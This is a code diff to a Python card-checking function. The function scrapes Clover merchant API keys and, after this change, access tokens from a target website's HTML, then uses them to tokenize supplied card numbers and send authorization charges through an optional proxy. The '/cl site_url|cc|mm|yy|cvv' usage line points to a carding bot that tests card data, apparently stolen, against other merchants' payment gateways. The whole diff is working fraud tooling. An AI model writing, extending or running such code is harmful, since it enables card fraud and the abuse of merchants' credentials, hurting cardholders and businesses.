@@ -27,6 +27,7 @@ def check_card_clover_sync(site_url, cc, mm, yy, cvc, proxy_url=None):
     Scrapes Clover keys from site_url and tokenizes + authorizes/charges.
     Returns: (status, message, brand)
     """
+    brand = _detect_card_brand(cc)
     if len(yy) == 2:
         yy = f"20{yy}"
 
@@ -62,14 +63,14 @@ def check_card_clover_sync(site_url, cc, mm, yy, cvc, proxy_url=None):
         merchant_match = re.search(r'merchantId["\']?\s*[:=]\s*["\']([A-Z0-9]{10,})["\']', html, re.IGNORECASE)
         merchant_id = merchant_match.group(1) if merchant_match else None
 
+        token_match = re.search(r'access_token["\']?\s*[:=]\s*["\']([a-f0-9\-]{30,})["\']', html, re.IGNORECASE)
+        access_token = token_match.group(1) if token_match else None
+
         if not api_key:
             return "error", "Missing Clover API key. Use: /cl site_url|cc|mm|yy|cvv", brand
 
-
-
         # Step 2: Tokenize Card via token.clover.com
         fp = _generate_clover_fingerprint()
-        brand = _detect_card_brand(cc)
 
         token_payload = {
             "card": {
@@ -112,7 +113,6 @@ def check_card_clover_sync(site_url, cc, mm, yy, cvc, proxy_url=None):
                 clean_err = re.sub(r'[\{\}\"\:]', '', clean_err).strip()
             return "declined", clean_err, brand
 
-
         tok_json = r_tok.json()
         token_id = tok_json.get('id')
         if not token_id:
@@ -128,9 +128,12 @@ def check_card_clover_sync(site_url, cc, mm, yy, cvc, proxy_url=None):
             "capture": False
         }
         charge_headers = {
-            "content-type": "application/json",
-            "apikey": api_key
+            "content-type": "application/json"
         }
+        if access_token:
+            charge_headers["Authorization"] = f"Bearer {access_token}"
+        else:
+            charge_headers["apikey"] = api_key
 
         r_charge = s.post(charge_url, json=charge_payload, headers=charge_headers, timeout=20)
         
